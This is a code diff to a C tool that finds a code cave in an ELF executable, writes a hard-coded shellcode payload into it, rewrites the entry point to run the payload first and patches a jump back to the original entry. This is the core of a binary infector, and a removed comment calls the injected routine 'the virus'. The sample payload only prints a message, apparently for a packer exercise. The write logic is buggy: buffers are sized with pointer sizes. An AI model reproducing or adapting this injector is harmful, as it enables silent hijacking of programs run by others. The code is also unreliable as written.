@@ -6,7 +6,7 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <stdio.h>
-#define JMP_BACK 9
+#define JMP_BACK 5
 
 //TODO ERROR CHECKS
 
@@ -15,6 +15,14 @@
 #else
 # define ElfW(type) Elf32_ ## type
 #endif
+
+//FOR TESTING PURPOSES
+char payload[] = "\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e" \
+"\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x2e\x2e\x2e" \
+"\x2e\x57\x4f\x4f\x44\x59\x2e\x2e\x2e\x2e\x0a\x48\x31\xc0\x48" \
+"\x31\xff\x48\x31\xd2\x48\x31\xf6";
+
+char jmp_back[] = "\xe9\xde\xad\xbe\xef";
 
 int is_sect_exec(char *file, ssize_t fsize, ssize_t entry, int len)
 {
@@ -89,22 +97,8 @@ ssize_t find_cave(char *file, ssize_t fsize, ssize_t payload_len, ssize_t *cave_
 	return 0;
 }
 
-ssize_t rewrite_entry(char *av, ssize_t cave, ElfW(Ehdr) *ehdr) {
-
-
-	int fd = open(av, O_RDWR);
-	read(fd, &ehdr, sizeof(ehdr));
-        ElfW(Addr) og_entry = ehdr->e_entry;
-	ehdr->e_entry = cave;
-        lseek(fd, 0, SEEK_SET);
-        write(fd, &ehdr, sizeof(ehdr));
-	close(fd);
-	return 0; 
-}
-
+//easier to manipulate file
 char *open_file(char *av, ssize_t *size) {
-	//easier to manipulate file
-		
 	struct stat fdata;
 	int fd;
 	char *file;
@@ -121,6 +115,7 @@ char *open_file(char *av, ssize_t *size) {
 	}
 
 	*size = fdata.st_size;
+
 	if ((file = mmap(0, (size_t)*size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
 	{
 		perror("mmap: ");
@@ -154,64 +149,64 @@ long	get_vaddr(FILE *fd) {
 	fseek(fd, 0, SEEK_SET); 
 	return phdr.p_vaddr;
 }
-/*
-char pre payload [ ] = {
-'\x50', '\x53', '\x51', '\x52', '\x56', '\x57', // push eax , ebx , ecx , edx , e s i , edi
-'\xE8', '.', '.' , '.', '.', // call ‘t h e v i r u s‘ function
-'\x5F' , '\x5E'	, ’ \x5A ’ , ’ \x59 ’ , ’ \x5B ’ , ’ \x58 ’ , // pop edi , e s i , edx , ecx , ebx , eax
-’ \xE9 ’ , ’ . ’ , ’ . ’ , ’ . ’ , ’ . ’ // jump to the old ent ry point
-};
-*/
 
-/*
-unsigned char payload[] = "\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e"
-"\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x2e\x2e\x2e"
-"\x2e\x57\x4f\x4f\x44\x59\x2e\x2e\x2e\x2e\x0a\x48\x31\xc0\x48"
-"\x31\xff\x48\x31\xd2\x48\x31\xf6";
-*/
+char	*craft_payload(char *pay, char *jmp, size_t size) {
 
-char payload[] = "\xe9\xde\xad\xbe\xef";
+	char *new_payload = calloc(size + JMP_BACK, sizeof(char *));
+	memcpy(new_payload, pay, size);
+	memcpy(new_payload + size, jmp, JMP_BACK);
 
-//"\x50\x51\x52\x53\x48\xc7\xc0\x30\x31\x00\x00\x5b\x5a\x59\xff\xe0"; //push regs; jmp; pop regs
+	return new_payload;
+}
+
+ssize_t patch_entry(FILE *fd, off_t cave, ElfW(Ehdr) *ehdr, ssize_t size) {
+
+        ElfW(Addr) og_entry = ehdr->e_entry;
+	ehdr->e_entry = cave;
+        fseek(fd, 0, SEEK_SET);
+        fwrite(ehdr, sizeof(ElfW(Ehdr)), 1,  fd);
+	
+	int jmp_addr = (og_entry - (cave + size + JMP_BACK)); // - instruction size AND payload size
+	memcpy(jmp_back + 1, &jmp_addr, sizeof(jmp_addr));
+
+	//write payload
+        fseek(fd, cave, SEEK_SET);
+	char *new_payload = craft_payload(payload, jmp_back, size);
+	fwrite(new_payload, sizeof(char *), sizeof(new_payload), fd);
+	free(new_payload);
+	fclose(fd);
+	return 0; 
+}
 
 int main(int ac, char **av) {
-
 
 	ElfW(Ehdr)	ehdr;
 	ssize_t		cave; 
 	ssize_t		fsize;
 	ssize_t		csize;
-	int		jmp_addr;
-	char *file = open_file(av[1], &fsize);
-	FILE *fd = fopen(av[1], "r+b");
-	size_t payload_size = sizeof(payload);
+	long 		base;
+	char 		*file = open_file(av[1], &fsize);
+	FILE 		*fd;
+	size_t 		payload_size = sizeof(payload) - 1;
+
+	if (!(fd = fopen(av[1], "r+b"))) {
+		dprintf(2, "fopen: Can't open file\n");
+		exit(1);
+	}
 
         fread(&ehdr, 1, sizeof(ehdr), fd);
-	long base = get_vaddr(fd);
+	base = get_vaddr(fd);
 
 	if ((cave = find_cave(file, fsize, payload_size + JMP_BACK, &csize)) == 0) {
 		dprintf(2, "Cave is too small to handle payload\n");
 		fclose(fd);
 		exit(1);
 	}
+	cave += base;
 
-	printf("Found cave at: 0x%lx; With the size of: %d ; Payload size: %d\n", cave + base, csize, payload_size);
-        fseek(fd, cave, SEEK_SET);
-        //fwrite(payload, sizeof(char *), strlen(payload), fd);
-	//rewrite_entry(av[1],cave,&ehdr);
+	printf("Found cave at: 0x%lx; With the size of: %d ; Payload size: %d\n", cave , csize, payload_size);
 
-//	fclose(fd);
+	patch_entry(fd, cave, &ehdr, payload_size);
 
-	int f = open(av[1], O_RDWR);
-	read(f, &ehdr, sizeof(ehdr));
-        ElfW(Addr) og_entry = ehdr.e_entry;
-	ehdr.e_entry = cave + base;
-        lseek(f, 0, SEEK_SET);
-        write(f, &ehdr, sizeof(ehdr));
-	jmp_addr = (og_entry - (cave + 5)); // - instruction size AND payload size
-	memcpy(payload + 1, &jmp_addr, sizeof(jmp_addr));
-        
-	fwrite(payload, sizeof(char *), strlen(payload), fd);
-	fclose(fd);
-	close(f);
+	return 0;
 }	
